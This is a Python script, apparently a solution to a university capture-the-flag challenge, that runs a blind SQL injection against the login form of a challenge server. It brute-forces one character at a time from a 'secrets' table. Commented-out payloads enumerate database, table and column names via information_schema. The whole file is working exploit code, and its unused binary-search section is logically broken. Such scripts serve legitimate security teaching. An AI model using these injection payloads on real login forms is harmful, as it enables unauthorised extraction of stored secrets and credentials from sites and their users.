import requests
import string

allchar = [chr(i) for i in xrange(127)]

print("beginning attempt")
cookies = {"CHALBROKER_USER_ID":"joe215"}
url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?"
#data = {"email":"' or ASCII(substring(database(), "+str(i)+", "+str(i)+"))="+character+"#;-- !","password":"ahdjasd"}
final = []
i = 1
flag = False

while i <= 60:
	print("Cracking character: " + str(i))
	top = 126
	bottom = 0
	for x in range(len(allchar)):
		data = {"email":"' or (SELECT ascii(substring((SELECT value from secrets limit 1),"+str(i)+",1))) = "+str(x)+";-- !","password":"ahdjasd"}
		#data = {"email":"' or (SELECT ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='secrets' limit 1,1),"+str(i)+",1)))="+str(x)+";-- !", "password":"ahdjasd"}
		#data = {"email":"' or (select ascii (substring((select table_name from information_schema.tables where table_schema = database() limit 1,1),"+str(i)+", 1)))="+str(x)+";-- !", "password":"ahdjasd"}
		#data = {"email":"' or (select ascii(substring(database()," + str(i) +",1"  + str(x) + "#;--!", "password":"ahdjasd"}
		req = requests.post(url, cookies=cookies, data=data)
		if "Welcome" in req.text:
			print("Character:" + str(allchar[x]))
			flag = True
			final.append(str(allchar[x]))
			break
		print(x)
	if not flag:
		print("Did not find value")
	i += 1
	'''
	while (top > bottom):
		mid = (top + bottom)//2
		#checking if equal to mid
		data = {"email":"' OR SELECT(ASCII(SUBSTRING(database(),"+str(i)+", 1)))="+str(mid)+"#;-- !","password":"ahdjasd"}
		req = requests.post(url, cookies = cookies, data = data)
		if "Welcome" in req.text:
			print("Database name character:" + str(allchar[mid]))
			final.append(allchar[mid])
			break
		#checking if less than mid
		data = {"email":"' OR SELECT(ASCII(SUBSTRING(database(),"+str(i)+", 1)))<"+str(mid)+"#;-- !", "password":"ahdjasd"}
		req = requests.post(url, cookies=cookies, data=data)
		if "Welcome" in req.text:
			print("l")
			bottom = bottom
			top = mid - 1
			break
		#checking if greater than mid
		data = {"email":"' OR SELECT(ASCII(SUBSTRING(database(),"+str(i)+", 1)))>"+str(mid)+"#;--!", "password":"ahdjasd"}
		req = requests.post(url, cookies=cookies, data=data)
		if "Welcome" in req.text:
			print("g")
			top = top
			bottom = mid + 1
			break
		print("uh oh")
	'''
print(final)
print(''.join(final))